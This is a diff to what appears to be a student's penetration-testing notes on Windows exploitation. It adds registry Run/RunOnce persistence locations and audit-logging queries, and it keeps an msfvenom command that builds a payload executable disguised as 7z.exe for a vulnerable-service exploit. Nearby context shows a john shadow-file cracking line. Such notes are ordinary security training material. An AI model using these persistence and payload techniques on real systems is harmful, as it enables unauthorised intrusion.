@@ -538,6 +538,15 @@ john --wordlist=Mywordlist.txt shadowfile
 -------------------------------------------------------------------------------------------------------------------------------------------------
 WINDOWS EXPLOITATION:
     net use * \\live.sysinternals.com\tools
+    runkeys, scheduled tasks ,powershell profiles, services
+
+
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run   or Runonce
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce   or run
+
+
 
   DLL Search Order:
    Hijacking:
@@ -565,7 +574,42 @@ WINDOWS EXPLOITATION:
   Vuln Services:
    wmic service list full
    sc query
-    msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\Student\\Desktop\\whoami.txt' -f exe > 7z.exe
+     msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\Student\\Desktop\\whoami.txt' -f exe > 7z.exe
+
+    
+    
+    
+Audit Logging:    
+  auditpol /get /category:*
+  auditpol /get /category:* | findstr /i "success failure"
+  auditpol /list /subcategory:"detailed tracking","DS Access"
+
+
+  get-eventlog -logname security -newest 50 -index 1  | format-list    -OR- event viewer
+  
+  
+  powersell logging
+        reg query hklm\software\microsoft\powershell\1\powershellengine
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
 
 
 
